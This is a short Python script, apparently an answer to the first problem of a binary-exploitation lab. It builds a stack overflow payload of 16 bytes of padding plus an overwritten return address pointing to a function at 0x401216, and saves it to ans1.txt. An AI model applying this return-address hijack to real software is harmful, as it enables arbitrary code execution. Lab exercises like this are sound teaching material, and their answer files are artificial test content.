# padding：填满缓冲区(8字节) + 覆盖saved rbp(8字节) = 16字节
padding = b"A" * 16
func1_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"
payload = padding + func1_addr

# 保存为二进制文件
with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Problem1 payload已生成到ans1.txt")
print(f"Payload长度：{len(payload)} 字节")